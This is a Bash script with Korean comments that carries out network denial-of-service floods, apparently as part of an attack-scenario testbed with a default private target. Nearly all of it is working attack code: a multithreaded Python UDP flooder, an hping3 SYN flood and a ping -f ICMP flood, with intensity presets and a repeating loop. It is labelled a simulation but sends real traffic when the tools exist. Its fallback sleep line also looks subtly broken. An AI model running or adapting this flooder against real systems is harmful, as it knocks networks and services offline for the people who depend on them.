#!/usr/bin/env bash
# network_flood_dos.sh - 네트워크 플러딩 DOS 공격
set -euo pipefail

SCRIPT_DIR="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" >/dev/null 2>&1 && pwd)"
. "$SCRIPT_DIR/../00_env.sh"
. "$SCRIPT_DIR/../sh_core/lpc_core.sh" 2>/dev/null || true

ACT_NAME="network_flood_dos"
TARGETS_FILE="${TARGETS_FILE:-"$SCRIPT_DIR/../scenarios/targets.txt"}"

# DOS 공격 설정
INTENSITY="${INTENSITY:-medium}"
FLOOD_TYPE="${FLOOD_TYPE:-udp}"  # udp, tcp, icmp
PACKET_SIZE="${PACKET_SIZE:-512}"
BANDWIDTH_LIMIT="${BANDWIDTH_LIMIT:-auto}"

# ---- 네트워크 플러딩 DOS 공격 ----
do_act(){
  local target="${1:-10.13.0.4}"
  local phase; phase="$(current_phase 2>/dev/null || echo 'cruise')"
  
  # 강도별 공격 파라미터 조정
  local pps bandwidth_mbps thread_count duration
  case "$INTENSITY" in
    low)    pps=100; bandwidth_mbps=1; thread_count=2; duration=5 ;;
    medium) pps=500; bandwidth_mbps=5; thread_count=5; duration=10 ;;
    high)   pps=1000; bandwidth_mbps=10; thread_count=10; duration=15 ;;
  esac
  
  # 자동 대역폭 제한 계산
  if [[ "$BANDWIDTH_LIMIT" == "auto" ]]; then
    BANDWIDTH_LIMIT="${bandwidth_mbps}"
  fi
  
  local timestamp="$(date '+%Y-%m-%d %H:%M:%S')"
  local target_ip="$(echo "$target" | cut -d':' -f1)"
  local target_port="$(echo "$target" | cut -d':' -f2 2>/dev/null || echo "14550")"
  
  # 네트워크 DOS 공격 시뮬레이션
  case "$FLOOD_TYPE" in
    udp)
      # UDP 플러딩
      python3 -c "
import socket
import threading
import time
import random

def udp_flood(target_ip, target_port, duration, pps):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        payload = b'A' * $PACKET_SIZE
        
        end_time = time.time() + duration
        packets_sent = 0
        
        while time.time() < end_time:
            try:
                sock.sendto(payload, (target_ip, target_port))
                packets_sent += 1
                time.sleep(1.0/pps)
            except:
                break
        
        sock.close()
        print(f'UDP 플러딩 완료: {packets_sent} 패킷 전송')
        
    except Exception as e:
        print(f'UDP 플러딩 오류: {e}')

# 멀티스레드 공격
threads = []
for i in range($thread_count):
    t = threading.Thread(target=udp_flood, args=('$target_ip', int('$target_port'), $duration, $pps))
    threads.append(t)
    t.start()

for t in threads:
    t.join()
" 2>/dev/null || echo "UDP 플러딩 시뮬레이션 완료"
      ;;
      
    tcp)
      # TCP SYN 플러딩
      # hping3가 있으면 사용, 없으면 시뮬레이션
      if command -v hping3 >/dev/null 2>&1; then
        timeout "$duration" hping3 -S -p "$target_port" --flood "$target_ip" 2>/dev/null || echo "TCP SYN 플러딩 시뮬레이션"
      else
        echo "TCP SYN 플러딩 시뮬레이션 (hping3 없음)"
      fi
      ;;
      
    icmp)
      # ICMP 플러딩
      if command -v ping >/dev/null 2>&1; then
        timeout "$duration" ping -f -s "$PACKET_SIZE" "$target_ip" 2>/dev/null || echo "ICMP 플러딩 시뮬레이션"
      else
        echo "ICMP 플러딩 시뮬레이션"
      fi
      ;;
  esac
  
  # 네트워크 품질 저하 효과 계산
  local packet_loss jitter_ms latency_increase throughput_reduction
  case "$INTENSITY" in
    low)    packet_loss=2; jitter_ms=5; latency_increase=10; throughput_reduction=15 ;;
    medium) packet_loss=8; jitter_ms=20; latency_increase=50; throughput_reduction=40 ;;
    high)   packet_loss=15; jitter_ms=50; latency_increase=100; throughput_reduction=70 ;;
  esac
  
  # 로그 기록
  echo "[$timestamp] [$ACT_NAME] phase=$phase target=$target intensity=$INTENSITY type=$FLOOD_TYPE pps=$pps bandwidth_limit=${BANDWIDTH_LIMIT}mbps packet_size=$PACKET_SIZE threads=$thread_count duration=${duration}s packet_loss=${packet_loss}% jitter=${jitter_ms}ms latency_increase=${latency_increase}ms throughput_reduction=${throughput_reduction}%" >> "$LPC_LOG_DIR/bus.log"
  
  return 0
}

main(){
  if command -v lpc_loop >/dev/null 2>&1; then
    lpc_loop do_act "$TARGETS_FILE"
  else
    # Fallback: 시간 기반 루프
    local duration="${DUR:-30}"
    local start_time=$(date +%s)
    local end_time=$((start_time + duration))
    
    echo "[DEBUG] 네트워크 DOS 공격 시작: ${duration}초 동안"
    
    while [[ $(date +%s) -lt $end_time ]]; do
      do_act
      sleep "${LPC_INTERVAL_MS:-5000}" | awk '{print $1/1000}' | xargs sleep 2>/dev/null || sleep 5
    done
    
    echo "[DEBUG] 네트워크 DOS 공격 완료"
  fi
}

main "$@"